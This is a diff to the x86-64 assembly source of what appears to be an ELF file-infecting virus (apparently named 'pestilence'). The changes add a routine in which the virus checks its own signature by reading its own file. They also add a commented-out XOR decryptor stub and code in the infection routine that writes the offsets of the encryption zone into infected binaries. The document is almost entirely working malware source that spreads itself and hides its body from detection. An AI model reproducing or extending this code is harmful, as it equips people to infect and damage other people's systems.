@@ -79,7 +79,9 @@
 ; 500 = first folder
 ; 551 = addr for mmap
 ; 559 = size of mmaped memory
-
+; 563 = read buffer for pread
+; 567 = start encryption offset
+; 571 = end encryption offset
 section .text
 	global _start
 _start:
@@ -94,16 +96,52 @@ _start:
 	; syscall
 	; cmp rax, 0
 	; jl cleanup
+.check_self:
+	mov rax, SYS_OPEN
+	mov rsi, 0
+	mov rdi, r14
+	syscall
+	cmp rax, 0
+	jl _end
+	mov r12, rax ; backup fd
+	mov rax, SYS_PREAD64
+	mov rdi, r12
+	lea rsi, [r15 + 563]
+	mov rdx, 4
+	mov r10, 8
+	syscall
+	mov rax, SYS_PREAD64
+	mov rdi, r12
+	lea rsi, [r15 + 567] ; save encryption zone start
+	mov rdx, 4
+	mov r10, 88
+	syscall
+	mov rax, SYS_PREAD64
+	mov rdi, r12
+	lea rsi, [r15 + 571] ; save encryption zone end
+	mov rdx, 4
+	mov r10, 92
+	syscall
+	cmp rax, 4
+	jne _end
+	mov rdi, r12
+	mov rax, SYS_CLOSE
+	syscall
+	cmp rax, 0
+	jl _end
+	cmp dword [r15 + 563], SIGNATURE
+	jne .infector
 .decryptor:
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
+	; xor rcx, rcx
+	; .loop:
+	; 	lea rdi, [rel _start]
+	; 	add rdi, rcx
+	; 	add rdi, .infector - _start
+	; 	xor byte [rsp + rdi], 42
+	; 	xor byte [rsp + rdi], 42
+	; 	inc rcx
+	; 	cmp rcx, pestilence - .infector
+	; 	jne .loop
 .infector:
 	call set_folder_chdir
 	chdir:
@@ -257,9 +295,6 @@ _start:
 					je .endloop
 					xor byte[r10 + r11], 42
 					xor byte[r10 + r11], 42			; if done twice, it reverses the encryption
-					; xor byte[r10 + r11], 42
-					; xor byte[r10 + r11], 42
-					; xor byte[r10 + r11], 42
 					dec r11
 					jmp .loop
 				.endloop:
@@ -334,6 +369,27 @@ _start:
 				syscall
 				cmp rax, 0
 				jbe .close_file
+
+				; writing start of encryption addess
+				mov rdi, r12
+				lea rsi, [r15 + 48]							; rsi = stat.st_size
+				mov rdx, 4 
+				mov r10, 88
+				mov rax, SYS_PWRITE64
+				syscall
+				cmp rax, 4
+				jl .close_file
+
+				mov rdi, r12
+				lea rsi, [r15 + 559]							; rsi = end of virus
+				mov rdx, 4
+				mov r10, 92
+				mov rax, SYS_PWRITE64
+				syscall
+
+				cmp rax, 4
+				jl .close_file
+				
 				mov rax, SYS_SYNC							; commiting filesystem caches to disk
 				syscall
 		.close_file:
